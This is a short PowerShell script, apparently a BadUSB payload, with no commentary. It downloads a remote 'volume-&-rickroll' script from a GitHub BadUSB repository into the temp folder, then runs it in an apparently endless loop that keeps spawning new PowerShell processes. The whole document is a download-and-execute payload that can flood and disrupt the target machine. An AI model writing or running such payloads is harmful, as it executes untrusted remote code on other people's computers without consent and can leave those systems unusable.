irm 'https://raw.githubusercontent.com/SuperJakov/Badusb/main/volume-changer/volume-&-rickroll.ps1' | Out-File -FilePath "$env:temp/s.ps1"
$p = "$env:USERPROFILE/AppData/Local/Temp/s.ps1"
for (1) { Start-Process powershell $p }